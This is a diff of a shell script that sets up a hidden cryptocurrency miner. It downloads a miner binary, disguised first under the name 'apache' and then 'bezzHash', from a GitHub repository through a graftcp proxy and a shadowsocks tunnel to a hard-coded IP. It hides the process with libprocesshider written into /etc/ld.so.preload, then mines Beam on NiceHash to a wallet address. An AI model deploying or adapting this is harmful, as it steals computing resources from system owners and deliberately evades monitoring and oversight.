@@ -9,7 +9,7 @@ chmod +x lba
 npm i -g node-process-hider 
 
 ph add graftcp
-ph add apache
+ph add bezzHash
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -45,18 +45,18 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/apache
-chmod +x apache
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
 
 apt -y install shadowsocks-libev rng-tools
 rngd -r /dev/urandom
 ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicApache.zip
-unzip magicApache.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./apache --algo beamhash --server beamv3.usa-west.nicehash.com --port 3387 --ssl 1 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --pass x
+./graftcp/graftcp ./bezzHash --par=beam3 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --server ssl://beamv3.usa-west.nicehash.com --port 3387 --pass IhatePopUps --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --ocX
